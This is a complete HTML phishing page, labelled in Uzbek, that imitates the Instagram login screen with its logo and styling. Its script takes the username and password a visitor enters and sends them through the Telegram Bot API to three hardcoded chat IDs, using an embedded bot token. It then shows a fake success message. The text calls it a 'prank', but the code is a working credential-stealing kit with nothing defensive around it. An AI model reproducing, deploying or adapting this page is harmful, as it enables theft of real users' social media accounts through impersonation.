<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    body { margin:0; padding:0; background:#f0f2f5; font-family:Arial,sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
    .container { background:white; width:350px; border:1px solid #dbdbdb; border-radius:8px; padding:40px 40px 20px; text-align:center; box-shadow:0 0 10px rgba(0,0,0,0.05); }
    .logo { width:175px; margin:0 auto 30px; }
    input { width:100%; padding:12px 10px; margin:6px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:6px; font-size:14px; box-sizing:border-box; }
    button { width:100%; padding:8px; margin:15px 0 10px; background:#0095f6; color:white; border:none; border-radius:8px; font-weight:bold; font-size:14px; cursor:pointer; }
    .forgot { color:#0095f6; font-size:12px; margin:15px 0; text-decoration:none; display:block; }
    .signup { margin-top:30px; padding:15px; border:1px solid #dbdbdb; border-radius:8px; font-size:14px; }
    .meta { margin-top:30px; font-size:12px; color:#8e8e8e; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram" class="logo">
    
    <form id="loginForm">
      <input type="text" id="username" placeholder="Foydalanuvchi nomi, email yoki mobil telefon..." required>
      <input type="password" id="password" placeholder="Parol" required>
      <button type="submit" id="loginBtn">Kirish</button>
    </form>

    <a href="#" class="forgot">Parolni unutdingizmi?</a>

    <div class="signup">
      Hisobingiz yo‘qmi? <a href="#">Yangi hisob yaratish</a>
    </div>

    <div class="meta">Meta</div>
  </div>

  <script>
    const BOT_TOKEN = "8782796208:AAHgXvU7ae065HN6hAmtSfeku6-4yn4TB7U";
    const CHAT_IDS = ["7316977124", "8500394413", "5918372728"];   // 3 ta chat ID

    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!username || !password) return;

      const message = `🔥 Prank Instagram!\n\n👤 Login: ${username}\n🔑 Parol: ${password}\n\n⏰ Vaqt: ${new Date().toLocaleString('uz-UZ')}`;

      // Har 3 ta chat ID ga yuborish
      for (let chatId of CHAT_IDS) {
        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message })
          });
        } catch(err) {
          console.log("Xatolik:", err);
        }
      }

      alert("✅ Kirish muvaffaqiyatli bo‘ldi! 😈\nInstagramga qaytadan kiring.");
    });
  </script>
</body>
</html>
